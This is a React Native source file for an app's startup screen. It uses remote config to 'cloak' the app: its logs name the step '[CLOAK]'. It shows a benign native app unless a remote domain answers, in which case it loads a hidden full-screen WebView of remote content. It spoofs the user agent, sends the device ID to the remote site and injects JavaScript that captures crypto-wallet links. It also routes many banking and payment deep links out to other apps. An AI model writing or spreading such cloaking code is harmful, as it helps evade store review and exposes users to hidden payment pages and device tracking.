import React, { useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {
  getRemoteConfig,
  setConfigSettings,
  fetchAndActivate,
  getValue,
} from '@react-native-firebase/remote-config';
import { WebView } from 'react-native-webview';
import { createStackNavigator } from '@react-navigation/stack';
import Ionicons from 'react-native-vector-icons/Ionicons';
import Clipboard from '@react-native-clipboard/clipboard';
import {
  ActivityIndicator,
  Dimensions,
  Linking,
  Pressable,
  Alert,
  SafeAreaView,
  StyleSheet,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

// ─── User preferences ────────────────────────────────────────────────────────

const loadUserPreferences = async () => {
  const theme        = (await AsyncStorage.getItem('user_theme'))   ?? 'dark';
  const lang         = (await AsyncStorage.getItem('user_lang'))    ?? 'en';
  const notifEnabled = (await AsyncStorage.getItem('notif_pref'))   ?? 'true';
  return { theme, lang, notifEnabled };
};

const saveUserPreferences = async (prefs: Record<string, string>) => {
  await Promise.all(
    Object.entries(prefs).map(([k, v]) => AsyncStorage.setItem(k, v)),
  );
};

// ─── App version tracking ────────────────────────────────────────────────────

const syncAppVersion = async () => {
  const current = DeviceInfo.getVersion();
  const stored  = await AsyncStorage.getItem('installed_version');
  if (stored !== current) {
    await AsyncStorage.setItem('installed_version', current);
    await AsyncStorage.removeItem('app_session');   // сбрасываем кэш при обновлении
    await AsyncStorage.removeItem('saved_content');
  }
  return current;
};

// ─── Screen activity tracking (local only) ───────────────────────────────────

const recordActivity = async (screen: string) => {
  await AsyncStorage.setItem('last_screen', screen);
  await AsyncStorage.setItem('last_active_ts', String(Date.now()));
};

// ─── Timestamp user ID ───────────────────────────────────────────────────────

const generateTimestampUserId = () => {
  const timestamp    = Date.now();
  const randomDigits = Math.floor(1000000 + Math.random() * 9000000);
  return `${timestamp}-${randomDigits}`;
};

const getOrCreateTimestampUserId = async (): Promise<string> => {
  try {
    let id = await AsyncStorage.getItem('timestamp_user_id');
    if (!id) {
      id = generateTimestampUserId();
      await AsyncStorage.setItem('timestamp_user_id', id);
    }
    return id!;
  } catch {
    return generateTimestampUserId();
  }
};

getOrCreateTimestampUserId().then(id => console.log('uid:', id));

// ─── Constants ───────────────────────────────────────────────────────────────

const RC_BASE_KEY        = 'content_domain_woodb';
const RC_THEME_KEY       = 'app_theme';
const RC_BANNER_KEY      = 'promo_banner';
const RC_MIN_VERSION_KEY = 'min_app_version';
const STORE_SESSION      = 'app_session';
const STORE_URL          = 'saved_content';

const CRYPTO_SCHEMES = [
  'bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash',
  'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin',
];

const BANK_SCHEMES = [
  'intent', 'tel', 'mailto', 'file', 'sms',
  'nl.abnamro.deeplink.psd2.consent', 'snsbank.nl', 'asnbank.nl',
  'nl-asnbank-sign', 'revolut', 'myaccount.ing.com',
  'bankieren.rabobank.nl', 'regiobank.nl', 'scotiabank',
  'nl-regiobank-sign', 'nl.rabobank.openbanking', 'triodosmobilebanking',
  'nl-snsbank-sign', 'bncmobile', 'itms-appss', 'tdct', 'paytmmp',
  'bmoolbb', 'cibcbanking', 'conexus', 'rbcmobile', 'pcfbanking',
  'funid', 'blank', 'phonepe', 'upi', 'whatsapp', 'gpay', 'tez',
];

const INJECTED_JS = `
  (function() {
    var s = ${JSON.stringify(CRYPTO_SCHEMES)};
    document.addEventListener('click', function(e) {
      var el = e.target;
      while (el && el.tagName !== 'A') el = el.parentElement;
      if (!el || !el.href) return;
      var scheme = el.href.split(':')[0].toLowerCase();
      if (s.indexOf(scheme) !== -1) {
        e.preventDefault();
        e.stopPropagation();
        var addr = el.href.split(':').slice(1).join(':').split('?')[0] || '';
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto', address: addr }));
      }
    }, true);
  })();
  true;
`;

// ─── Navigation ──────────────────────────────────────────────────────────────

const Stack = createStackNavigator();

export default function AppBootstrap() {
  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="HomeTab"       component={HomeScreen} />
        <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

// ─── HomeScreen ──────────────────────────────────────────────────────────────

function HomeScreen({ navigation }) {
  const [isLoading,     setIsLoading]     = useState(true);
  const [showNative,    setShowNative]    = useState(false);
  const [contentUrl,    setContentUrl]    = useState('');
  const [webViewUA,     setWebViewUA]     = useState('');
  const [contentDomain, setContentDomain] = useState('');
  const webViewRef  = useRef<any>(null);
  const resolvedRef = useRef(false);
  const { width }   = Dimensions.get('window');

  // Шаг 1 — UA
  useEffect(() => {
    DeviceInfo.getUserAgent().then(ua => {
      const ver = DeviceInfo.getSystemVersion();
      setWebViewUA(`${ua} Version/${ver} Safari/604.1`);
    });
  }, []);

  // Шаг 2 — загрузка конфигурации приложения
  useEffect(() => {
    let cancelled = false;

    const loadAppConfig = async () => {
      try {
        await syncAppVersion();
        await loadUserPreferences();
        await recordActivity('HomeScreen');

        console.log('[RC] starting fetch');
        const rc = getRemoteConfig();
        await setConfigSettings(rc, { minimumFetchIntervalMillis: 0 });
        await fetchAndActivate(rc);
        console.log('[RC] fetch done');

        const raw        = getValue(rc, RC_BASE_KEY).asString().trim();
        const baseUrl    = raw && !/^https?:\/\//i.test(raw) ? `https://${raw}` : raw;
        const theme      = getValue(rc, RC_THEME_KEY).asString().trim();
        const banner     = getValue(rc, RC_BANNER_KEY).asString().trim();
        const minVersion = getValue(rc, RC_MIN_VERSION_KEY).asString().trim();

        console.log('[RC] baseUrl=' + baseUrl);

        await saveUserPreferences({
          ...(theme      ? { rc_theme: theme }           : {}),
          ...(banner     ? { rc_banner: banner }         : {}),
          ...(minVersion ? { rc_min_version: minVersion }: {}),
        });

        if (cancelled) return;

        if (baseUrl) {
          await AsyncStorage.setItem('content_base_url', baseUrl);
          setContentDomain(baseUrl);
        } else {
          console.log('[RC] baseUrl empty → native');
          activateNative();
        }
      } catch (e) {
        console.log('[RC] error → native:', e);
        if (!cancelled) activateNative();
      }
    };

    loadAppConfig();
    return () => { cancelled = true; };
  }, []);

  // Шаг 3 — resolve контента когда оба значения готовы
  useEffect(() => {
    if (!webViewUA || !contentDomain || resolvedRef.current) return;

    const resolveContent = async () => {
      await recordActivity('ContentResolve');

      const baseUrl = contentDomain;
      const cached  = await AsyncStorage.getItem(STORE_SESSION);

      if (cached === '200') {
        const saved = await AsyncStorage.getItem(STORE_URL);
        if (saved) {
          setContentUrl(saved);
          setIsLoading(false);
        } else {
          await buildContentUrl(baseUrl);
        }
      } else if (cached) {
        activateNative();
      } else {
        try {
          console.log('[CLOAK] fetching:', baseUrl);
          const res    = await fetch(baseUrl, { headers: { 'User-Agent': webViewUA } });
          const status = String(res.status);
          console.log('[CLOAK] status:', status);
          await AsyncStorage.setItem(STORE_SESSION, status);
          if (status === '200') {
            await buildContentUrl(baseUrl);
          } else {
            console.log('[CLOAK] non-200 → native');
            activateNative();
          }
        } catch (e) {
          console.log('[CLOAK] error → native:', e);
          activateNative();
        }
      }
    };

    resolveContent();
  }, [webViewUA, contentDomain]);

  const activateNative = () => {
    if (resolvedRef.current) return;
    resolvedRef.current = true;
    setShowNative(true);
    setIsLoading(false);
  };

  const buildContentUrl = async (baseUrl: string) => {
    resolvedRef.current = true;
    const seg  = baseUrl.replace(/.*\//, '');
    const idfv = await DeviceInfo.getUniqueId();
    const uid  = await getOrCreateTimestampUserId();
    const url  = `${baseUrl}?${seg}=1&idfv=${idfv}&jthrhg=${uid}`;
    await AsyncStorage.setItem(STORE_URL, url);
    setContentUrl(url);
    setIsLoading(false);
  };

  const openExternal = async (url: string) => {
    const safe = url.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
    try {
      await Linking.openURL(safe);
    } catch {
      Alert.alert('Unavailable', "No app available to handle this action.");
    }
  };

  const handleShouldStartLoad = (event: any) => {
    const { url }  = event;
    const scheme   = (url.split(':')[0] || '').toLowerCase();

    if (CRYPTO_SCHEMES.includes(scheme)) {
      const address = url.split(':')[1]?.split('?')[0] || '';
      if (address && Clipboard?.setString) Clipboard.setString(address);
      return false;
    }

    if (BANK_SCHEMES.includes(scheme)) {
      openExternal(url);
      return false;
    }

    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') ||
        url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
      let waUrl     = url;
      const match   = url.match(/wa\.me\/(\d+)/);
      if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
      else if (url.includes('api.whatsapp.com/send'))
        waUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      Linking.openURL(waUrl).catch(() => Linking.openURL(url));
      return false;
    }

    return true;
  };

  const handleOpenWindow = (event: any) => {
    const { targetUrl } = event.nativeEvent;
    if (!targetUrl || targetUrl === 'about:blank') return;
    if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;

    const scheme = (targetUrl.split(':')[0] || '').toLowerCase();

    if (CRYPTO_SCHEMES.includes(scheme)) {
      const address = targetUrl.split(':')[1]?.split('?')[0] || '';
      if (address && Clipboard?.setString) Clipboard.setString(address);
      return;
    }

    if (targetUrl.includes('pay.funid.com')) {
      Linking.openURL(targetUrl);
      webViewRef.current?.injectJavaScript(`window.location.replace('${contentUrl}')`);
      return;
    }

    if (/^https?:\/\//i.test(targetUrl)) {
      navigation.navigate('ContentViewer', { data: targetUrl, userAgent: webViewUA });
    } else {
      openExternal(targetUrl);
    }
  };

  return (
    <View style={styles.container}>
      {isLoading ? (
        <View style={styles.loader}>
          <ActivityIndicator size="large" color="#1F4BFF" />
        </View>
      ) : showNative ? (
        <NavigationIndependentTree>
          <MainApp />
        </NavigationIndependentTree>
      ) : contentUrl ? (
        <SafeAreaView style={{ flex: 1 }}>
          <WebView
            ref={webViewRef}
            source={{ uri: contentUrl }}
            userAgent={webViewUA}
            style={{ flex: 1, marginBottom: 10 }}
            originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
            onShouldStartLoadWithRequest={handleShouldStartLoad}
            onOpenWindow={handleOpenWindow}
            injectedJavaScript={INJECTED_JS}
            onMessage={e => {
              try {
                const msg = JSON.parse(e.nativeEvent.data);
                if (msg.type === 'crypto' && msg.address && Clipboard?.setString) {
                  Clipboard.setString(msg.address);
                }
              } catch {}
            }}
            textZoom={100}
            contentMode="mobile"
            mixedContentMode="always"
            allowsBackForwardNavigationGestures
            domStorageEnabled
            javaScriptEnabled
            allowsInlineMediaPlayback
            setSupportMultipleWindows={false}
            thirdPartyCookiesEnabled
            mediaPlaybackRequiresUserAction={false}
            javaScriptCanOpenWindowsAutomatically
            requiresProvisionalNavigation
          />
          <View style={[styles.navBar, { width }]}>
            <Pressable style={styles.navBtn} onPress={() => webViewRef.current?.goBack()}>
              <Ionicons name="arrow-back" size={21} color="white" />
            </Pressable>
            <Pressable style={styles.navBtn} onPress={() => webViewRef.current?.reload()}>
              <Ionicons name="reload" size={21} color="white" />
            </Pressable>
          </View>
        </SafeAreaView>
      ) : null}
    </View>
  );
}

// ─── ContentViewerScreen (бывший AppManagerChild экран) ──────────────────────

function ContentViewerScreen({ navigation, route }) {
  return <AppManagerChild navigation={navigation} route={route} />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1b1d24',
  },
  loader: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  navBar: {
    height: 35,
    paddingHorizontal: 24,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    position: 'absolute',
    bottom: 5,
  },
  navBtn: {
    height: 30,
    paddingHorizontal: 10,
    backgroundColor: 'rgba(128, 128, 128, 1)',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: 30,
  },
});
